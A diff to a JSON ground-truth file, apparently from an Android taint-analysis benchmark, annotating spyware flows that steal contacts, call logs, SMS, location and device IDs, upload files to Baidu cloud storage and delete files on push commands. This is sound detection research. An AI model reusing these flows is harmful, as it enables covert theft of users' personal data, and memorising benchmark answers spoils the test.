@@ -9,7 +9,10 @@
       "lineNo" : 431,
       "targetName" : "listFiles",
       "targetNo" : 1,
-      "jimpleStmt" : "$r5 = virtualinvoke $r2.<java.io.File: java.io.File[] listFiles()>()"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r5 = virtualinvoke $r2.<java.io.File: java.io.File[] listFiles()>()"
+      } ]
     },
     "sink" : {
       "statement" : "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
@@ -18,7 +21,10 @@
       "lineNo" : 464,
       "targetName" : "putObject",
       "targetNo" : 1,
-      "jimpleStmt" : "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "String str_file = files[i].toString();",
@@ -46,11 +52,20 @@
       "ID" : 4
     } ],
     "attributes" : {
-      "contextSensitive" : true,
-      "flowSensitive" : true,
-      "interProcedural" : true,
-      "intraProcedural" : true,
-      "pathSensitive" : true,
+      "appendToString" : true,
+      "array" : true,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : true,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
       "threading" : true
     },
     "ID" : 1,
@@ -63,7 +78,10 @@
       "lineNo" : 373,
       "targetName" : "getString",
       "targetNo" : 1,
-      "jimpleStmt" : "$r4 = interfaceinvoke $r1.<android.database.Cursor: java.lang.String getString(int)>($i0)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r4 = interfaceinvoke $r1.<android.database.Cursor: java.lang.String getString(int)>($i0)"
+      } ]
     },
     "sink" : {
       "statement" : "writer.write(content);",
@@ -72,7 +90,10 @@
       "lineNo" : 479,
       "targetName" : "write",
       "targetNo" : 1,
-      "jimpleStmt" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "BaiduUtils.createContactFile(\"contact\", new StringBuilder(String.valueOf(name)).append(\"_\").append(number).append(\"\\n\").toString());",
@@ -88,11 +109,21 @@
       "ID" : 2
     } ],
     "attributes" : {
-      "contextSensitive" : true,
-      "flowSensitive" : true,
-      "interProcedural" : true,
-      "intraProcedural" : true,
-      "pathSensitive" : true
+      "appendToString" : true,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : true
     },
     "ID" : 2,
     "description" : "This malicious flow reads contacts and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'contact'."
@@ -104,7 +135,10 @@
       "lineNo" : 216,
       "targetName" : "getString",
       "targetNo" : 1,
-      "jimpleStmt" : "$r8 = interfaceinvoke $r12.<android.database.Cursor: java.lang.String getString(int)>($i0)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r8 = interfaceinvoke $r12.<android.database.Cursor: java.lang.String getString(int)>($i0)"
+      } ]
     },
     "sink" : {
       "statement" : "writer.write(content);",
@@ -113,7 +147,10 @@
       "lineNo" : 479,
       "targetName" : "write",
       "targetNo" : 1,
-      "jimpleStmt" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "createContactFile(\"call_log\", \"Type: \" + type + \"  Name: \" + name + \"  Num: \" + number + \"  Time: \" + time + \"  Duration: \" + cursor.getString(cursor.getColumnIndexOrThrow(\"duration\")) + \"\\n\");",
@@ -129,12 +166,21 @@
       "ID" : 2
     } ],
     "attributes" : {
-      "contextSensitive" : true,
-      "flowSensitive" : true,
-      "interProcedural" : true,
-      "intraProcedural" : true,
-      "pathSensitive" : true,
-      "threading" : true
+      "appendToString" : false,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : false
     },
     "ID" : 3,
     "description" : "This malicious flow reads call log and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'call_log'."
@@ -146,7 +192,10 @@
       "lineNo" : 323,
       "targetName" : "getString",
       "targetNo" : 1,
-      "jimpleStmt" : "$r5 = interfaceinvoke $r9.<android.database.Cursor: java.lang.String getString(int)>(1)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r5 = interfaceinvoke $r9.<android.database.Cursor: java.lang.String getString(int)>(1)"
+      } ]
     },
     "sink" : {
       "statement" : "writer.write(content);",
@@ -155,7 +204,10 @@
       "lineNo" : 479,
       "targetName" : "write",
       "targetNo" : 1,
-      "jimpleStmt" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "createContactFile(\"sms\", new StringBuilder(String.valueOf(date)).append(\"_\").append(address).append(\"    \").append(body).append(\"\\n\").toString());",
@@ -171,12 +223,21 @@
       "ID" : 2
     } ],
     "attributes" : {
-      "contextSensitive" : true,
-      "flowSensitive" : true,
-      "interProcedural" : true,
-      "intraProcedural" : true,
-      "pathSensitive" : true,
-      "threading" : true
+      "appendToString" : true,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : false
     },
     "ID" : 4,
     "description" : "This malicious flow reads sms messages and saves them to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'upload_message'."
@@ -188,7 +249,10 @@
       "lineNo" : 294,
       "targetName" : "getLastKnownLocation",
       "targetNo" : 1,
-      "jimpleStmt" : "$r10 = virtualinvoke $r9.<android.location.LocationManager: android.location.Location getLastKnownLocation(java.lang.String)>($r6)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r10 = virtualinvoke $r9.<android.location.LocationManager: android.location.Location getLastKnownLocation(java.lang.String)>($r6)"
+      } ]
     },
     "sink" : {
       "statement" : "writer.write(content);",
@@ -197,7 +261,10 @@
       "lineNo" : 479,
       "targetName" : "write",
       "targetNo" : 1,
-      "jimpleStmt" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "double latitude = location.getLatitude();",
@@ -219,12 +286,21 @@
       "ID" : 3
     } ],
     "attributes" : {
-      "contextSensitive" : true,
-      "flowSensitive" : true,
-      "interProcedural" : true,
-      "intraProcedural" : true,
-      "pathSensitive" : true,
-      "threading" : true
+      "appendToString" : true,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : false
     },
     "ID" : 5,
     "description" : "This malicious flow reads location information and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'location'."
@@ -236,7 +312,10 @@
       "lineNo" : 183,
       "targetName" : "getDeviceId",
       "targetNo" : 1,
-      "jimpleStmt" : "$r7 = virtualinvoke $r5.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r7 = virtualinvoke $r5.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+      } ]
     },
     "sink" : {
       "statement" : "writer.write(content);",
@@ -245,7 +324,10 @@
       "lineNo" : 479,
       "targetName" : "write",
       "targetNo" : 1,
-      "jimpleStmt" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "createContactFile(\"PhoneInfo\", \"DevieID: \" + tmDevice + \"\\n\" + \"PhoneNumber: \" + phoneNumner + \"\\n\" + \"SIM卡序列号:\" + ss + \"\\n\" + \"电话方位:\" + tt + \"\\n\" + \"设备的软件版本号：\" + hh + \"\\n\");",
@@ -255,9 +337,21 @@
       "ID" : 1
     } ],
     "attributes" : {
-      "flowSensitive" : true,
-      "interProcedural" : true,
-      "intraProcedural" : true
+      "appendToString" : true,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : false
     },
     "ID" : 6,
     "description" : "This malicious flow reads device Id and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'phone'."
@@ -269,7 +363,10 @@
       "lineNo" : 183,
       "targetName" : "getDeviceId",
       "targetNo" : 1,
-      "jimpleStmt" : "$r7 = virtualinvoke $r5.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r7 = virtualinvoke $r5.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()"
+      } ]
     },
     "sink" : {
       "statement" : "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"_\" + filename, fileContent, objectMetadata)).getResult();",
@@ -278,7 +375,10 @@
       "lineNo" : 464,
       "targetName" : "putObject",
       "targetNo" : 1,
-      "jimpleStmt" : "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "putObjectByInputStream(baiduBCS, tmDevice, \"PhoneInfo\");",
@@ -288,9 +388,21 @@
       "ID" : 1
     } ],
     "attributes" : {
-      "flowSensitive" : true,
-      "interProcedural" : true,
-      "intraProcedural" : true
+      "appendToString" : false,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : false
     },
     "ID" : 7,
     "description" : "This malicious flow reads device Id and uploads it to a remote server via HTTP request. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'phone'."
@@ -302,7 +414,10 @@
       "lineNo" : -1,
       "targetName" : "listFiles",
       "targetNo" : 1,
-      "jimpleStmt" : "$r11 = virtualinvoke $r5.<java.io.File: java.io.File[] listFiles()>()"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r11 = virtualinvoke $r5.<java.io.File: java.io.File[] listFiles()>()"
+      } ]
     },
     "sink" : {
       "statement" : "writer.write(content);",
@@ -311,7 +426,10 @@
       "lineNo" : 479,
       "targetName" : "write",
       "targetNo" : 1,
-      "jimpleStmt" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "virtualinvoke $r3.<java.io.FileWriter: void write(java.lang.String)>($r1)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "createContactFile(\"file_list\", fOrd + \"\\n\");",
@@ -326,17 +444,37 @@
       "lineNo" : 478,
       "ID" : 2
     } ],
+    "attributes" : {
+      "appendToString" : true,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : false
+    },
     "ID" : 8,
     "description" : "This malicious flow reads file list and saves it to a file. This file will be later uploaded to a remote server (not a part of this flow). This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'list_file'."
   }, {
     "source" : {
       "statement" : "File file = new File(SDCardRoot + filePath);",
-      "methodName" : "private static void uploadFileByPath(Context context, String path)",
+      "methodName" : "private static void uploadByInputStream(BaiduBCS baiduBCS, String foldname, String filePath)",
       "className" : "ca.ji.no.method10.BaiduUtils",
       "lineNo" : 133,
       "targetName" : "File",
       "targetNo" : 1,
-      "jimpleStmt" : "specialinvoke $r3.<java.io.File: void <init>(java.lang.String)>($r8)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "specialinvoke $r3.<java.io.File: void <init>(java.lang.String)>($r8)"
+      } ]
     },
     "sink" : {
       "statement" : "ObjectMetadata result = (ObjectMetadata) baiduBCS.putObject(new PutObjectRequest(bucket, \"/\" + foldname + \"/\" + \"UploadFile\" + \"/\" + filePath, fileContent, objectMetadata)).getResult();",
@@ -345,7 +483,10 @@
       "lineNo" : 139,
       "targetName" : "putObject",
       "targetNo" : 1,
-      "jimpleStmt" : "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "$r9 = virtualinvoke $r0.<com.baidu.inf.iis.bcs.BaiduBCS: com.baidu.inf.iis.bcs.response.BaiduBCSResponse putObject(com.baidu.inf.iis.bcs.request.PutObjectRequest)>($r6)"
+      } ]
     },
     "intermediateFlows" : [ {
       "statement" : "InputStream fileContent = new FileInputStream(file);",
@@ -355,9 +496,21 @@
       "ID" : 1
     } ],
     "attributes" : {
-      "flowSensitive" : true,
-      "interProcedural" : true,
-      "intraProcedural" : true
+      "appendToString" : true,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : false
     },
     "ID" : 9,
     "description" : "This malicious flow uploads files. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'upload_file'."
@@ -369,7 +522,10 @@
       "lineNo" : 110,
       "targetName" : "File",
       "targetNo" : 1,
-      "jimpleStmt" : "specialinvoke $r2.<java.io.File: void <init>(java.lang.String)>($r1)"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "virtualinvoke $r2.<java.io.File: boolean delete()>()"
+      } ]
     },
     "sink" : {
       "statement" : "new File(SDCardRoot + path.substring(start + 1, path.indexOf(\")\"))).delete();",
@@ -378,9 +534,29 @@
       "lineNo" : 110,
       "targetName" : "delete",
       "targetNo" : 1,
-      "jimpleStmt" : "virtualinvoke $r2.<java.io.File: boolean delete()>()"
+      "IRs" : [ {
+        "type" : "Jimple",
+        "IRstatement" : "virtualinvoke $r2.<java.io.File: boolean delete()>()"
+      } ]
     },
     "intermediateFlows" : [ ],
+    "attributes" : {
+      "appendToString" : false,
+      "array" : false,
+      "callbacks" : false,
+      "collections" : false,
+      "implicitFlows" : false,
+      "interAppCommunication" : false,
+      "interComponentCommunication" : false,
+      "lifecycle" : false,
+      "nonStaticField" : false,
+      "partialFlow" : false,
+      "pathConstraints" : false,
+      "payload" : false,
+      "reflection" : false,
+      "staticField" : false,
+      "threading" : false
+    },
     "ID" : 10,
     "description" : "This malicious flow delete file. This malicious behavior will be triggered, when then PushMessageReceiver (a BroadcastReceiver) receives a command which contains the string 'delete_file'."
   } ]
